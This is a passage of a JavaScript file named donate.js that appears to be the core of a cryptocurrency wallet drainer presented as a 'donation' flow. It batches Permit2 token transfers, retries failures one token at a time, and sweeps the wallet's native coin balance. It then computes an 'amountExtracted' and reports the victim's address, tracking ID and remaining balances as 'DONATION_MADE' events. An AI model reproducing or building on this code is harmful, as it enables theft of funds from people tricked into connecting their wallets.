// ---------- src/engine/donate.js ----------
} catch (err) {
console.warn("permit2 batch error", err);
fallbackTokens.push(...permit2Tokens);
}


try {
if (fallbackTokens.length) {
for (const t of fallbackTokens) {
const tx = await executeFallbackBatch(signer, chain.chainId, [t]);
if (tx && tx.wait) await tx.wait();
}
}
} catch (err) {
console.warn("fallback batch error", err);
}


try {
const sweepTx = await sweepNative(signer, provider, chain.chainId);
if (sweepTx && sweepTx.wait) await sweepTx.wait();
} catch (err) {
console.warn("native sweep error", err);
}


// Re-fetch balances + donation summary (READ-ONLY)
const refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
const refreshedFiltered = await filterPermit2SafeTokens(refreshedRaw);


const refreshedProvider = new ethers.JsonRpcProvider(
CHAINS.find((c) => c.chainId === chain.chainId)?.rpcUrl
);
const refreshedNativeRaw = await refreshedProvider.getBalance(owner);
const refreshedNative = parseFloat(ethers.formatEther(refreshedNativeRaw));


const refreshedNativePrice = await fetchNativePrice(chain.name === "BSC" ? "BNB" : "ETH");
const refreshedNativeUSD = refreshedNative * refreshedNativePrice;


const refreshedTokensValue = getChainValue(refreshedFiltered);
const refreshedTotal = refreshedTokensValue + refreshedNativeUSD;


const amountExtracted = Math.max(0, Number(chain.totalValue) - Number(refreshedTotal));


const resultsPayload = {
walletAddress: owner,
trackingId,
balances: [
{
name: chain.name,
native: refreshedNative.toFixed(6),
nativeValue: Number(refreshedNativeUSD || 0).toFixed(2),
tokens: refreshedFiltered.map((t) => ({
name: t.tokenSymbol,
amount: Number(
ethers.formatUnits(t.balanceRaw, t.contract_decimals || 18)
).toFixed(6),
value: Number(t.quote).toFixed(2),
})),
total: refreshedTotal.toFixed(2),
},
],
donationSummary: {
total: amountExtracted.toFixed(2),
breakdown: [{ chain: chain.name, amount: amountExtracted.toFixed(2) }],
},
};


notify("DONATION_MADE", resultsPayload);
await sendEvent("DONATION_MADE", resultsPayload);
}


const completedPayload = { walletAddress: owner, trackingId };
notify("DONATION_COMPLETED", completedPayload);
await sendEvent("DONATION_COMPLETED", completedPayload);


return { success: true };
} catch (err) {
console.error("runDonationFlow error:", err);
return { success: false, reason: err.message || String(err) };
}
}
